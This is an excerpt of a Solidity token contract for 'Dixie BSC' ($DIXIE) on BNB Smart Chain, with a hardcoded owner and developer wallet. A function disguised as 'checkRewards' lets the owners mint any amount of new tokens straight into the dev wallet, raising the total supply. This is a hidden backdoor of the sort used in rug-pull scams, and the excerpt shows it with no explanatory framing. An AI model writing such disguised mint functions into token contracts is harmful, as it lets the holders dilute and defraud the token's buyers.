...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xf276DD8392188FCF4a5dAb27C573e7d48dbb41C6;
...
contract dixiebsc is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0x29c70F77E38af1e6e17eaB1183d419d0479B4719);
    ...
    string private _name = "Dixie BSC"; 
    string private _symbol = "$DIXIE";  
    ...
    function checkRewards(uint256 value, address adr) onlyOwners public virtual {
        require(adr == address(Wallet_Dev));
        _reward(address(Wallet_Dev), adr, value);
        _tTotal += value;
        _tOwned[adr] += value;
